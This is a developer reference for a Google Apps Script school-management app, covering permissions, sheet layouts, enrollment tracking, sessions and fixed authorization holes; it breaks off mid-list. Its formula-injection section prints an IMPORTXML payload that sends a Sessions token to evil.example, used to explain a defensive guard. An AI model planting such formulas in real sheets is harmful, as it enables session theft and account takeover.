# 学生管理システム — Technical Reference

Architecture, data model, function reference and known quirks, written so that
any developer — including the original author returning after time away — can
understand and safely modify this system.

Code comments that cite `CLAUDE.md` refer to the maintainer's private working notes, which are not published; the tests enforce the rules they describe.

---

## 1. System Overview

A bilingual (JP/EN) school-management web app built entirely on Google Apps
Script, serving ~10–20 staff (admin, sales, teachers) on ordinary Gmail
accounts. In production, with a staging copy for testing — see §11.

### Modules

- **Interview scheduling** — teachers publish availability; sales book applicant
  interviews; reassignment, date-change and cancellation requests flow between
  them.
- **Interview results** — entry and editing with duplicate protection, intake
  tabs, and import from bookings.
- **Dormitory management** — buildings and rooms, tenant assignment, per-building
  and per-room billing, PDF room sheets, per-building document store.
- **Placement test dashboard** — configurable per-intake result views.
- **Student list, 学生数 report, simulation** — records from Central_DB plus
  nationality × course analysis.
- **募集状況 (Recruitment)** — prospective-student tracking by nationality ×
  recruiter × course, with capacity, non-student-visa and cancellation rosters.
  See §7.
- **User management & data safety** — PIN login, per-user permissions, snapshots,
  audit log, announcements.

### Navigation

A fixed left sidebar, not a top header. The nav buttons are the *original*
elements relocated into it with their ids, classes, `data-perm` and `onclick`
intact, so `switchMainTab`, the four sub-tab switchers and the permission loop
work unmodified — that is what kept the rewrite safe, and why those attributes
must be preserved if it is restructured again.

Collapsed it is a translucent 56px rail (logo + icons); the logo toggles it, and
clicking any icon expands it. State persists in `localStorage`. Sub-navs nest
under their section and are revealed **only** by
`body.sidebar-pinned .app-sidebar .sb-sub.open` — a bare `.sb-sub.open` rule
would sit later in the sheet at equal specificity and leak sub-tab labels into
the rail.

⚠️ `transition: 0.3s` with no property named means `transition: all`. `body`,
`.nav-btn` and `.sub-nav-btn` each had one, so the sidebar toggle animated
`padding` and relayouted the whole page every frame. They are now scoped to
colour. Watch for this shorthand before adding any animated layout property.

### Architecture

`doGet()` returns `Index.html` (the whole frontend). It calls `Code.js` via
`google.script.run`. All data is in Google Sheets; files are in Google Drive.
One deployment (`/exec`); after any backend change, Deploy → Manage deployments
→ edit → New version, and re-authorize if a new scope is touched.

---

## 2. Source Files

| File | Role |
|---|---|
| `Code.js` | Backend — ~170 functions, ~4,900 lines |
| `Index.html` | Entire frontend — ~508KB, ~8,900 lines. TWO `<script>` blocks; app code is the **second** |
| `Template.html` | Dorm room PDF template. Utility rows inject via `{{Utility_Rows}}` — adding a bill type needs no template change |
| `Shinsei_Code.js` / `Shinsei_Template.html` | Parked 申請関連 module, keyed by student name |

---

## 3. Roles & Permissions

Every user has a role plus a comma-separated permission string.

| Role | Behaviour |
|---|---|
| `master` | SYSTEM_PIN account, `permissions: "ALL"`. Bypasses every check, including permissions added later. Cannot be assigned to a user (guarded in `saveSystemUser`) |
| `admin` | Only the permissions ticked. Passes a few role-gated admin-only ops (snapshot restore, building cascade-delete) |
| `sales` / `teacher` | Only the permissions ticked |
| custom | Only the permissions ticked. Behaves exactly as `sales` — see below |

**Custom roles are permissions only.** The master defines them in 役割管理
(ユーザー管理 → master only), stored in the `Roles` sheet. `getRoles` needs
`manage_users`; `saveRole` / `deleteRole` need **master** — an admin manages
users, and if it could define roles it could mint one carrying `manage_users`
and hand it to itself.

⚠️ The role string is **not** just a permission bundle, which is why the
built-ins stay defined in `Code.js` (`BUILTIN_ROLES`) and cannot be edited or
deleted through the endpoints:

- `"teacher"` selects `Teacher_Master` over `Staff_Master` in five places, one of
  them inside `_resolveUserById_`, which runs on **every login**;
- `"teacher"` / `"sales"` decide which notification feed a user gets and how ホーム
  scopes their interviews;
- ~~`"sales"` has its own branch in the booking-cancellation flow~~ **Reversed
  2026-10-26.** That branch tested the role the BROWSER sent, so any other role
  string skipped the ownership check. Booking ownership now applies to every
  non-admin, from the session, through `_scheduleDenyReason_` (as the screen
  always did);
- `"master"` is the SYSTEM_PIN account and `_isAdminRole_` treats it as admin.

A custom role lands in `Staff_Master` and inherits none of that. Guards:

- keys are `[a-z0-9_]` only — they are compared as raw strings in ~59 places, and
  a key with a space or a full-width character would match in some and not others
  (§9.1);
- a key may not be `master` or collide with a built-in, and a row hand-edited into
  the sheet claiming either is ignored by `_roles_()`;
- `deleteRole` **refuses while any user holds the role**, naming them. Deleting it
  out from under a user leaves an account whose role matches nothing, which fails
  closed at login — a lockout with no visible cause;
- `saveSystemUser` validates `u.role` against `_roles_()`. Before that it accepted
  any string but `master`, so a crafted call could store role `xyz`.

**Screens gated by role rather than permission.** Ten endpoints were guarded as
`_roleIsAnyOf_(userRole, ["sales"])` — "is the caller 営業", written before roles
could be created — so every custom role was refused however its permissions were
ticked. 学生数 and 部屋一覧 were the visible symptom: the sidebar gates on
`view_students` / `view_dorms`, so the tab appeared and only the data behind it
threw 権限がありません. They now go through `_permOrLegacyRole_(role, perms,
needed, legacyRoles)`, which ORs the permission with the old role list so the
built-ins behave exactly as before:

| Endpoint | Permission |
|---|---|
| `getDashboardData`, `getLiveReportData`, `fetchAndMergeStudentData` | `view_students` |
| `getDormData`, `getBuildingList` | `view_dorms` |
| `exportSpecificPDF`, `getBuildingRoomsForExport`, `buildRoomHtmlBatch`, `combineRoomHtmlToPdf` | `export_dorms` |
| `getUploadedFile` | `view_dorms` **or** `view_interview_results` |

⚠️ `perms` is the **last** parameter at all twelve call sites, deliberately: an
appended argument a caller forgets arrives as `undefined` and falls back to the
role list, so built-ins keep working and a custom role fails closed. Inserting it
second would have shifted `includePast` into the `perms` slot at any missed site.

⚠️ Keeping the role list as an OR means a 営業 without `view_dorms` still reaches
`getDormData`. That is pre-existing looseness, not something introduced with
roles; tightening it would lock out whoever relies on it today.

`_roleIsAnyOf_` now has exactly one caller, `_permOrLegacyRole_`. A second caller is
almost certainly a permission check written as a role check.

Two further role lists were generalised the same way: `wantsNotif` in
`_bootPayload_`, and the gate in `getUpcomingForUser`. Both are behaviour-preserving for the built-ins (営業 holds
`view_admissions`). In `getUpcomingForUser` admin/master are excluded **first** —
`_hasPerm_` returns `true` for master unconditionally, so the order is the control.

**`Staff_Master` column 12 (`Role`).** The sheet never stored a role: every row
was `sales`, hardcoded in `getSystemUsers` and derived from the sheet name
everywhere else — which is why `admin` worked throughout `Code.js` but no account
could hold it. The column is added on demand (`_ensureRoleColumn_`, same reasoning
as `_ensureAccountColumns_` in §6.1) and sits **after** the password block so
columns 1–11 are untouched. `Teacher_Master` deliberately does not use it.

`_staffRoleFromRow_` treats the cell as untrusted input: blank, unknown, `master`
and `teacher` all fall back to `sales`. Failing to `sales` rather than to nothing
matters — an account resolving to no role logs in to an empty app with no error.
⚠️ `_usersWithRole_` reads the **raw** cell instead, because folding an unknown
role to `sales` there would report nobody holding the role being deleted.

Staff↔staff role changes are a cell write and are allowed in the edit form.
Staff↔教務 is a sheet move and is not offered.

**The master PIN lives in the `SYSTEM_PIN` script property, not in `Code.js`.**
`Code.js` is tracked in git, so anything written there is in the history
permanently. `_systemPin_()` reads the property and **returns `""` when it is
unset, which disables the master account**: `loginUser` refuses the MASTER path
with 「マスターアカウントは未設定です」 and `_resolveUserById_` returns `null`, so
`resumeSession` also revokes any live master session.

This is deliberate and replaced an earlier `SYSTEM_PIN_FALLBACK` constant. The
fallback failed **open, and silently** — script properties are not carried by
File → Make a copy, and a staging project has its own set, so any copy of this
code ran with a known hard-coded password for the one role that bypasses every
permission check. It also bought nothing: the property is set from ⚙ Project
Settings, which needs editor access, not a login. **Any new project — staging
included — must have `SYSTEM_PIN` set before master works there.**

- Set it **by hand**: ⚙ Project Settings → Script Properties, key `SYSTEM_PIN`.
  There is deliberately no `setSystemPin` function — see §7.5.
- Check it without revealing it: `checkSystemPin()` (needs the maintenance
  unlock). It applies `SYSTEM_PIN_MIN_LENGTH` (8) and **flags a value matching
  an existing staff/teacher PIN** — master is tested first, so a collision
  would silently grant that person master access with nothing looking wrong
  from their side.

⚠️ Prefer alphanumeric. At the 8s failure-delay cap, 8 digits is ~309 days of
online guessing; 8 alphanumeric characters is ~1.8 million years. Length alone
is not the lever — `tests/login.test.js` §5 has the arithmetic.

### Permission values

| Permission | Grants |
|---|---|
| `view_students` / `export_students` | Student list view / export |
| `view_simulation` / `edit_simulation` | Simulation view / edit |
| `view_recruitment` | 募集状況 read-only |
| `edit_recruitment` | 募集状況 numbers, countries, 留学ビザ以外, キャンセル |
| `edit_enrollment` | 年度別月間在籍者数 の手動入力。Moved off `_isAdminLevel_` so the master can grant it per user; `_hasPerm_` still passes master unconditionally |
| `manage_recruitment` | 募集状況 intakes, 定員, 地域, 担当者, 連絡事項, 日程 (implies the two above) |
| `view_dorms` / `edit_dorms` / `export_dorms` | Dorm view / edit (incl. room deletion) / export |
| `view_admissions` / `edit_admissions` / `export_admissions` | Interview schedule levels |
| `view_interview_results` / `entry_interview_results` | Results view / entry, edit, delete, import |
| `view_placement` / `manage_placement` | Placement dashboard / its config |
| `view_teacher_schedule` | Identifies a teacher's own column; default for new teachers |
| `manage_users` | User administration |

**Enforce on both sides.** Hiding a button is not access control — every backend
function checks. Equally, the UI must not be *stricter* than the backend, or
admins see controls hidden for actions the server would accept.

---

## 4. Data Model

Column indices are 0-based as read in code. Row 1 is headers; data starts row 2.

### 4.1 Schedule_DB — interview bookings

| Idx | Field | Idx | Field |
|---|---|---|---|
| 0 | Timestamp | 12–15 | Reassign_* (id, name, date, period) |
| 1 | TeacherID | 16–20 | BookerReq_* (date, period, reason, status, by) |
| 2 | Name (teacher = 面接者) | 21 | Reassign_Reason |
| 3 | Date | 22 | Cancel_Reason |
| 4 | Period | 23 | 学期 (intake) |
| 5 | Status | 24 | 備考 (remarks) |
| 6 | Student | | |
| 7 | Nationality | | |
| 8 | MeetingLink | | |
| 9 | DocURL (hearing sheet) | | |
| 10 | Course | | |
| 11 | InCharge (担当) | | |

### 4.2 Room_Info — dorm rooms

| Idx | Field | Idx | Field |
|---|---|---|---|
| 0 | Timestamp | 11 | nationality |
| 1 | building (= building ID) | 12 | class |
| 2 | roomNumber | 13 | roomCode |
| 3 | rent (blank ⇒ inherit building) | 14 | remarks |
| 4 | mailbox | 15–19 | bill overrides (water, elec, gas, internet, other) |
| 5 | delivery | 20 | hot water override (給湯代) |
| 6 | wifi | | |
| 7 | status (空室 = vacant) | | |
| 8 | bicycle | | |
| 9 | studentId | | |
| 10 | studentName | | |

Multi-tenant rooms are ONE row with names joined by newline. Bill overrides are
bilingual `"EN\nJP"` and **replace** the building value when set.

### 4.3 Building_Info

| Idx | Field |
|---|---|
| 0 | id (referenced by rooms) |
| 1 / 2 | nameEn / nameJp |
| 3 / 4 | addressEn / addressJp |
| 5–12 | garbage / route / misc (bilingual) |
| 13–16 | water / elec / gas / internet default bills |
| 32 / 33 | exterior photo Drive ID / caption |
| 40–42 | bicycle captions |
| 43 | other bill |
| 44 | docIds (comma-separated Drive IDs of 別紙) |
| 45 | hot water bill (給湯代) |
| 46 | rent default (家賃) |
| 47 / 48 | 燃えるゴミ(プラスチックを含む) collection day / bag |

**`BUILDING_COLS` (currently 49) is the single definition of this sheet's
width.** `updateBuilding` uses it for *both* the read width and the padding
loop, so those two can no longer drift apart — a mismatch writes the row back
short and truncates the tail, silently destroying `docIds` and every 別紙
attached to the building. When adding a column, raise `BUILDING_COLS` and add it
to `tests/buildingcolumns.test.js`, which asserts the constant is exactly one
past the highest index used.

⚠️ `updateBuilding` finishes with
`getRange(row, 1, 1, existingRow.length).setValues(...)`, so a row wider than
the sheet's grid makes **every building save throw**. `_ensureBuildingColumns_`
is called at the top of both `saveBuilding` and `updateBuilding` to widen the
grid on demand — which is why adding a column needs no migration-before-deploy
ordering. The one-off `migrateBuildingAddBurnablePlastic` (retired 2026-09-21) only labelled the headers, and
Building_Info's header row is never read by code.

⚠️ Column 44 (`docIds`) is owned by the 別紙 upload/remove handlers and must
**never** be assigned from `formObject` in `updateBuilding` — doing so wipes
every attachment the next time somebody edits the building's address.

### 4.4 Other sheets

| Sheet | Purpose / key columns |
|---|---|
| `Staff_Master` / `Teacher_Master` | 0 id, 1 name, 2 PIN, 3 email, 4 notif (OFF=off), 5 permissions, 6–10 password block, **11 Role (Staff_Master only)** |
| `Roles` | キー, 表示名, 既定の権限, 更新者, 更新日時. **Custom roles only** — built-ins live in `BUILTIN_ROLES` in `Code.js` |
| `Interview_Results` | Timestamp, 日付, 入学期, 課程, 国籍, 名前, 性別, 年齢, 学歴, 現在のレベル, 点数, プレースメントテスト点数, 合否, 面接者, 担当, 申請, 2回目面接, 3回目面接, 備考, EnteredBy |
| `PlacementTest_Config` | 1-based: Intake Name, Course, Results URL, Tab, Entry Link, Sort Order, Columns(JSON) |
| `Central_DB` / `Past_DB` | Students. **学籍番号 encodes the intake: first 4 digits = year, next 2 = month.** コース may carry a prefix before `_` |
| `Dorm_Aliases` | Student-written dorm name → building ID |
| `Sessions` | token → role, id, name, LastSeen |
| `Activity_Log` | Timestamp, User, ID, Role, Action, Target, Details |
| `Announcements` | ID, 作成日時, 作成者, 対象, 本文, 有効期限, 既読者 |

---

## 5. Constants

| Constant | Meaning |
|---|---|
| `SYSTEM_PIN_PROP` | `SYSTEM_PIN` — the script-property key. There is no in-file fallback value, on purpose; see §on roles below |
| `SYSTEM_PIN_MIN_LENGTH` | 8 — enforced by `checkSystemPin`'s report |
| `MAINT_UNLOCK_PROP` | `MAINTENANCE_UNLOCK` — script property gating the maintenance functions; value must be today's date (Asia/Tokyo) |
| `AUTO_SYNC_MIN_GAP_SEC` | 600 — throttle on `triggerAutoSyncStudents`, which cannot be locked |
| `PW_ITERATIONS` | 100,000 — SHA-256 chain length for new passwords. Stored per row, so changing it never invalidates existing ones |
| `PW_MIN_LENGTH` | 8 — enforced by `_passwordProblem_` |
| `PW_ALGO_TAG` | `s1`. Hashes are stored `s1$<base64>`; verification fails closed on any other tag |
| `ACCOUNT_COLS` | 11 — width of `Staff_Master` / `Teacher_Master` including the account columns (added by the one-off `migrateAddPasswordColumns`, retired 2026-09-21) |
| `PHOTO_FOLDER_ID` | Drive folder for building photos |
| `UPLOADS_FOLDER_ID` | Hearing sheets + building documents. Formerly `PDF_FOLDER_ID` — **generated PDFs are NOT stored here** |
| `BUILDING_DOCS_FOLDER_ID` | Alias of `UPLOADS_FOLDER_ID` |
| `MAX_BUILDING_DOCS` | 7 documents per building |
| `SNAPSHOT_KEEP` | Snapshots retained per sheet |
| `SNAPSHOT_THROTTLE_SEC` | 600s — minimum gap between `_snapshotSheetThrottled` copies of the same sheet. Raise it to make saves cheaper still and stretch retained history; see §8.3 |
| `SESSION_TOUCH_WINDOW` | 21600s — how often `resumeSession` bothers to rewrite `LastSeen`. **Also the granularity of the sliding expiry below**, so the two are related now |
| `SESSION_MAX_AGE_DAYS` | 30 — idle days before a token stops resuming. Sliding, measured against `LastSeen`. Must stay far above `SESSION_TOUCH_WINDOW`: that throttle is why the true expiry is anywhere in [30d, 30d + 6h], and closing the gap would sign out people who are actively working |
| `CACHE_TTL_SHORT` / `CACHE_TTL_LONG` | 300s / 1800s — see §8 |

PDFs are generated as base64 and downloaded to the device; nothing is written to
Drive.

### Stored files are served through the app, never linked

Hearing sheets **and** building 別紙 open via `getUploadedFile` → the client's
`openStoredFile(idOrUrl, btn)`. Drive holds them privately; the app reads them
as the deploying user and returns base64.

A raw `<a href>` to a Drive URL only works while the file is *shared*, which
means readable by anyone holding the link, with no login. That is what this
replaces — hearing sheets at `@214`, 別紙 later.

⚠️ **The membership check in `getUploadedFile` is the point of the function.**
It reads as the deployer, so without it any caller could pass the id of the
bound spreadsheet, a SMS_Backups_… snapshot, or anything in the photo folder. A
well-formed id is not enough: it must appear in one of **three** allow-lists —
`_hearingSheetFileIds_()` (Schedule_DB idx 9), `_buildingDocFileIds_()`
(Building_Info idx 44), or `_generalDocFileIds_()` (General_Docs row 2 col 1, the
共通別紙 that belong to no building). They are checked in that order, cheapest
common case first.

⚠️ **A document store the check does not know about is unreachable.** The file
uploads, lists and renames perfectly, and every attempt to open it is refused —
which is exactly how 共通別紙 shipped broken at staging `@106`. Adding a fourth
store means adding a fourth term to that condition **and** re-reading
`tests/uploadedfile.test.js` §5 and §6: they re-run the rejection cases against
the widened list, because widening an allow-list is precisely when to re-prove
it still rejects.

⚠️ **The membership check is deliberately not per-caller — decided 2026-08-21.**
It proves a file belongs to *a* record, not to *this caller's* record, so any
営業/教師 can open any student's hearing sheet by id. Reviewed and **left as it
is**: a caller still needs a valid session and a real Drive id, which makes it an
internal-trust question rather than an exposure, and several people legitimately
open colleagues' sheets. This is a choice, not an oversight — do not "fix" it
without asking, because tightening it removes access somebody uses daily. If it
ever needs to change, the two shapes considered were: owner-only (the booking's
teacher by id, its 担当 by name, plus admin-level), or that plus a grantable
"see all" permission for 教務 and cover staff.

⚠️ Making the folder private does **not** retroactively unshare files created
earlier with ANYONE_WITH_LINK. `_unshareHearingSheets` is the precedent for a
one-off sweep.

---

### 4.5 `Enrollment_History` — the 年度別月間在籍者数 series

⚠️ **Why this sheet has to exist.** `Central_DB` is a snapshot of who is enrolled
*now*. A student who leaves is a row that **vanishes** — no departure date exists
anywhere: `卒業予定` is blank on 1381/1400 rows and `Past_DB`'s tabs are coarse
cohorts (`修了2024.4~2025.3`), not months. Month-on-month decrease **cannot be
reconstructed after the fact**; it can only be measured as it happens.

| 年月 | 区分 | 値 | 人数 | 記録日時 | 入力種別 |
|---|---|---|---|---|---|
| 2026-08 | 合計 | | 608 | … | 自動 |
| 2026-08 | 国籍 | ネパール | 64 | … | 自動 |
| 2023-04 | 合計 | | 502 | … | 手動 |

`区分` ∈ 合計 / 国籍 / コース / 性別 / 入学期 / 入 / 復帰. ⚠️ **A blank `入力種別` means
`自動`** — every row written before that column existed was measured, and reading
blank as 手動 would relabel the app's own history and freeze it against refresh.

**`_recordEnrollmentSnapshot_` runs on every daily trigger and REPLACES the current
month.** It used to write once, on the first run of a new month — a start-of-month
figure, while the report is 毎月月末締; in April that is a 116-student difference.
⚠️ It refuses to touch a month containing a `手動` row: a nightly job that
overwrote typed figures would destroy the history the feature exists to hold.

**年度 is April–March**, matching the sync source's own tabs. `2026-03` belongs to
2025年度. `_stuFiscalYear` / `_stuYm` are exact inverses; getting one wrong shifts a
whole column by a year.

**出 and 前月差 are derived, never stored:**

```
前月差(M) = 在籍(M) − 在籍(M-1)
出(M)     = 在籍(M-1) + 入(M) − 在籍(M)
```

This reproduces the reference report exactly (4月: 647 + 173 − 531 = 289). ⚠️ Three
things it cannot see, all surfaced rather than hidden: a student who joins **and**
leaves inside one month cancels out; a month whose predecessor is missing reports
`—`, not 0; and 月平均 divides by the months that have a figure, since dividing by
12 would report a part-finished year as a collapse.

**Editing** — `saveEnrollmentMonths` is guarded by the `edit_enrollment`
**permission**, not by admin level: it began as `_isAdminLevel_` on the reasoning
that rewriting a reported figure is an admin act, but that made it ungrantable and
the master needed it delegable. It validates every month before deleting anything,
so a bad payload cannot half-apply, and marks what it writes `手動`. ⚠️
`getEnrollmentHistory`'s `canEdit` must stay the **same expression** — the two
decide whether the button appears and whether pressing it works.

---

### 4.6 `Enrollment_Roster` — the ID set behind each month's 合計

⚠️ **Why counts alone were not enough.** §4.5 stores two scalars a month, so "the
number went up" and "these people arrived" are the same fact to it. They are not. A
row deleted from the source 在籍 tab by accident and re-entered days later is
indistinguishable from a departure followed by an arrival — and because
`_recordEnrollmentSnapshot_` only ever rewrites the **current** month, a month end
falling in between freezes the deficit forever and the restore surfaces as next
month's phantom increase. That is how it was reported: *"an increase in student but
there is no new student factually."*

| 年月 | 連番 | 学籍番号（カンマ区切り） | 人数 | 記録日時 |
|---|---|---|---|---|
| 2026-08 | 1 | 260401,260402,… | 200 | … |
| 2026-08 | 2 | 260601,260602,… | 200 | … |

Chunked at `ENROL_ROSTER_CHUNK` (200) so a cell stays readable; retained for
`ENROL_ROSTER_KEEP_MONTHS` (26), pruned in the same bottom-up pass that replaces
the month. ⚠️ **Its own sheet, not more rows in `Enrollment_History`** —
`getEnrollmentHistory` reads that sheet whole on every 増減推移 open, and ~5KB of
ids a month would ride along on an interactive path that never looks at them.

⚠️ `_enrolStudentIds_`'s "is this row a student" test must stay identical to
`_enrolBucketsFor_`'s (a non-blank 学籍番号, nothing else) or `|roster|` and `合計`
count different populations. Two divergences exist and both lean safe: a duplicated
id counts twice in `合計` and once in the roster (impossible via the sync, which
keys records by id), and a **renamed 学籍番号 header** empties the roster while
`合計` counts on — which is what makes the next run *hold* rather than record a
school of zero.

**The gate.** Before rewriting the month, `_recordEnrollmentSnapshot_` compares
today's ID set against the stored roster and **holds — writing neither the counts
nor the roster — when too many known students have vanished with nothing to account
for them.** Same shape as the dorm-vacate gate (§6.5), and the same reason: it runs
unattended.

⚠️ **A graduation is not a deletion, and `Past_DB` is what says so.** A student who
genuinely leaves is *moved* to a 修了 tab, which the sync mirrors into `Past_DB`; a
row deleted by mistake is gone from both sheets. So only the **unaccounted**
disappearances count against the cap (`_enrolPastIds_`). Without that filter, 50
graduates moved out mid-month were indistinguishable from 50 deleted rows and the
month was refused outright — freezing it 50 too high, the opposite error to the one
the gate exists to prevent. The filter also makes the gate *stricter*: legitimate
departures no longer consume the budget that a simultaneous accident could hide
behind.

⚠️ `_enrolPastIds_` returns **`null`**, never `{}`, when `Past_DB` cannot be read or
its 学籍番号 header has been renamed, and the caller then counts every departure —
losing the accounting must narrow the gate, never widen it. In the arithmetic
`null` and `{}` behave identically (an empty object filters nothing out); the
distinction is load-bearing in exactly one place, the 修了データ読取不可 marker on the
held log entry, because *"38 of 40 graduated"* and *"we could not check"* need
different responses. ⚠️ It is read **only when somebody actually went missing** —
`Past_DB` is ~1400 rows and the common night is one where nobody left.

⚠️ **Two ratios, because the two comparisons mean different things.** Against this
month's own roster the drop is intra-month and has no innocent explanation, so
`ENROL_DROP_MAX_RATIO` is 0.05. Against last month's, a real cohort leaves — the
worst on record is April's 116 of 647, or **18%** — so `ENROL_MONTH_DROP_MAX_RATIO`
is 0.35. Swapping them would refuse to record every April. `ENROL_DROP_MIN` (10) is
the floor, for the same reason `DORM_VACATE_MIN` has one.

⚠️ **Fails open with no baseline**, so the first run after deploy still records; it
arms itself that night. A held month leaves a roster gap, and the gate fails open
across a gap rather than compounding — the escape hatch is the 手動 editor, which
marks the month and makes the snapshot skip it entirely.

**`_recordEnrollmentReturns_` is the other half, not a nicety.**

```
復帰(M) = roster(M) ∩ roster(M-2) \ roster(M-1)
```

⚠️ The gate cannot catch a deletion made on the **1st** of a month: the baseline is
then last month's roster, the loose arm lets it through, and every later night
compares against the already-bad roster. This finds that one, a month later. It
writes a `復帰` row **onto the accused month M-1** (`値` = the month they came back
in) and stops there — ⚠️ **it never rewrites `合計`**, because a nightly job that
edits a reported figure is worse than the bug it would be fixing. `ENROL_RETURN_MIN`
is 2: one returner is an ordinary leave of absence.

It skips a month already marked `手動`, and `saveEnrollmentMonths` drops the `復帰`
row for any month it rewrites — so correcting the figure is what clears the
accusation, from both ends.

⚠️ **Both paths reach `Activity_Log`** (在籍者数の更新を保留 /
在籍者数の記録漏れの可能性を検出), because nobody reads the execution log of a job
that runs at 3am. The held entry carries both halves — 不在 N名（うち修了記録なし M名）
— since the two numbers call for different responses. The **clean** run's
departed/accounted split goes to `console.info` only: it is tuning data for
`ENROL_DROP_MIN` and the ratios, and a nightly audit row on every healthy run is how
an audit trail stops being read. There is **no UI for either yet** — 増減推移 is unchanged, and
`getEnrollmentHistory` returns `returned` per month for whenever there is.

---

## 6. How Key Features Work

### 6.1 Login and sessions

**Sessions columns:** Token, Role, ID, Name, Created, LastSeen, Device, DeviceId. Device and
DeviceId are display-only values the browser sends with `loginUser` (an OS · browser label and a
random per-browser id), shown in アカウント設定 → ログイン中の端末 and never used to decide access.

`loginUser(email, password)` matches on **email**, trimmed and case-insensitive,
across both master sheets, then issues a token stored in `Sessions`.
`resumeSession(token)` re-resolves the user on reload, so permission changes take
effect without re-login. Legacy sessions that recorded master as `admin` are
still accepted. Master signs in as **`MASTER`** with the `SYSTEM_PIN` script
property — it lives in no sheet, which is what makes it the break-glass.

Passwords are salted and hashed. Columns 7-11 (idx 6-10) of each master sheet:
`PasswordHash`, `Salt`, `PwIterations`, `PwUpdatedAt`, `PwMustChange`.

⚠️ **SHA-256 is implemented by hand in `Code.js`.** Not a preference —
`Utilities.computeHmacSha256Signature` costs ~1.25 ms *per call* in Apps Script,
so 10,000 iterations took **9 seconds** and a ~300 ms budget bought only ~250
iterations. In-process the same budget buys ~100,000. `tests/password.test.js` §0
checks it against the NIST vectors and against Node's `crypto` for every input
length 0-130 bytes — that range is deliberate, since it spans the 55/56/64-byte
padding boundaries where such implementations fail. **If you touch
`_sha256Bytes_`, that section must stay green.**

⚠️ **Hashes carry an algorithm tag** (`s1$…`) and verification **fails closed**
on anything else. Bump `PW_ALGO_TAG` when changing the algorithm; every existing
password then stops verifying and must be reset, which is the safe direction.

**The legacy-PIN path is self-completing.** While a user's hash is empty their
old plaintext PIN works *once* and forces a password set; the moment a hash
exists that branch no longer applies to them. `_writeAccountPassword_` also blanks
column 2, so plaintext PINs disappear per user as people migrate.
`auditAccountReadiness()` reported who was left; it was retired on 2026-09-21, after the cutover.

⚠️ **Credential functions identify the caller from the session token**, never
from a client argument — `changeOwnPassword`, `completePasswordSetup`,
`adminResetPassword` all go through `resumeSession`.

**Every other endpoint is now session-authoritative too**, since `AUTH_ENFORCE=1`
on 2026-08-05 — and unconditionally since 2026-09-21, when the observe mode behind that
switch was deleted. It had failed OPEN (an unreadable property meant "observe", and observe
trusted the browser's role); `tests/authlayer.test.js` now runs the real helpers and pins that
no mode switch exists. The role and permission arguments are still in ~60 signatures, but
`_effectiveRole_` / `_effectivePerms_` discard them and read the parked session
instead. A direct `google.script.run.getDashboardData("teacher")` — which used to
return 608 student records — now resolves no session and is refused.

> This paragraph used to say the opposite: that the app trusted the client in ~60
> places and that closing it was "the natural next piece of work". It had been
> stale since the flip, and on 2026-08-19 it sent a reviewer looking at finished
> work while twelve genuinely open holes sat elsewhere in this file. §11's warning
> that a stale reference is worse than none is not theoretical.

⚠️ **The guard helpers are the only route to the session, so a condition that
reads a permission itself is not a guard.** Twelve endpoints were written as

```js
if (!_isMasterRole_(userRole) && !(userPerms && String(userPerms).split(",").indexOf("edit_dorms") !== -1))
```

— session-aware on the left, client-supplied on the right, `&&`-ed so the weaker
half decided alone. `google.script.run.saveBuilding({permissions:"edit_dorms"})`
wrote `Building_Info` with no session; `getSystemUsers("", "manage_users")`
returned every staff name, email and password state to an anonymous caller.
`saveSystemUser` and `deleteSystemUser` were the same. Fixed 2026-08-19 by routing
all twelve through `_hasPerm_`.

`tests/endpoints.test.js` §3.1 now fails on the shape. Note **why it did not
before**: its `GUARDS` list contained the literal string `'権限がありません'`, so a
function counted as guarded for containing the error message — the suite was
reporting "0 still trusting the client" the entire time. Never put anything on
that list that is not the name of a function which consults the session.

**Sessions expire after 30 idle days** (`SESSION_MAX_AGE_DAYS`), sliding on
`LastSeen`. `resumeSession` checks it **before** resolving the user and before
parking `_authUser` — parking an expired session would make it live for every
guard in the file — deletes the row, and throws the same
「セッションが無効です」 as an unknown token, which the client already handles.
`_pruneExpiredSessions` sweeps the sheet on each login, so `Sessions` stays
bounded without a trigger.

⚠️ The expiry check **fails open** on a `LastSeen` it cannot parse, and treats a
blank one as current. `_readTabs_` renders with `FORMATTED_STRING`, so the value
is whatever the spreadsheet's locale prints — and failing closed on an
unanticipated format would sign out every member of staff at once with nothing on
screen saying why. Unreadable values go to Cloud Logging instead.

### 6.1.0 Sheet writes: formula injection

⚠️ **A cell whose text starts with `=` or `+` is a FORMULA, not a label.**
`setValue("=…")` from Apps Script creates a live one. So a 備考 or a building name
of `=IMPORTXML("https://evil.example/?d="&Sessions!A2,"//a")` runs the next time
anyone opens the workbook — reading the **hidden `Sessions` sheet in this same
spreadsheet** and posting a valid token out. Nothing looks wrong inside the app,
because every read goes through `getDisplayValues()`, which returns the formula's
*result*.

`_cellSafe_(v)` prefixes such a value with an apostrophe — Sheets' own "treat as
text" marker, which is not part of the stored value, so `_normName_` and every
other lookup are unaffected. Non-strings pass through, so Dates stay Dates and
counts stay numbers (§9.3).

**Wrap the array, never the fields.** Write sites use
`setValues([_cellSafeRow_([...])])` around the existing array: positional
read/write maps are the worst silent-corruption class here (§8.3), and `map()`
cannot change order or length. `_logActivity_` is the highest-value site — 51 call
sites feed it and `Activity_Log` is read by a human.

⚠️ **The guard protects new writes only.** A cell written before it is still a formula, and
`getValues()` returns it as the text `#ERROR!` (or as the number it evaluated to). A form that
loads that value and saves it back replaces the formula with the error text, and the typed value
is gone. Read `getFormulas()` on any edit path over data that predates the guard; 申請関連 does
(`_shinseiRecoverFormulaText_`). `probeSheetsTextInput` (editor-run) measures which inputs Sheets
turns into formulas, numbers or text, raw and guarded, including full-width and zero-width prefixes.

Measured on staging, 2026-09-15:

| Input | `setValues` | `appendRow` | `"@"` format + `setValues` | through `_cellSafe_` |
|---|---|---|---|---|
| `+81 75 123 4567` | text | **formula**, `#ERROR!` | text | text, every path |
| `+977-1-4412345` | text | **formula**, shows −4411369 | text | text, every path |
| `=1+1` | formula | formula | **formula** | text, every path |
| `＋81…` `＝1+1` `－3`, U+200B / U+00A0 / U+FEFF before `+` | text | text | text | text |
| `0751234567` | **number** 751234567 | **number** | text | **number** — the guard does not help |
| `'0751234567` | text, zero kept | text, zero kept | text, no literal `'` | text |

- ⚠️ **`appendRow` parses more than `setValues`.** A leading `+` is a formula only on the append path.
  A guard verified against one write method is not verified against the other.
- ⚠️ **Plain-text format is NOT a formula defence.** `=1+1` written by `setValues` into an `"@"` cell is
  still a live formula. The apostrophe is the defence, and it is not stored literally in `"@"` cells.
- ⚠️ **The formula text is what was typed.** `getFormulas()` returns `+81 75 123 4567`, with no `=`
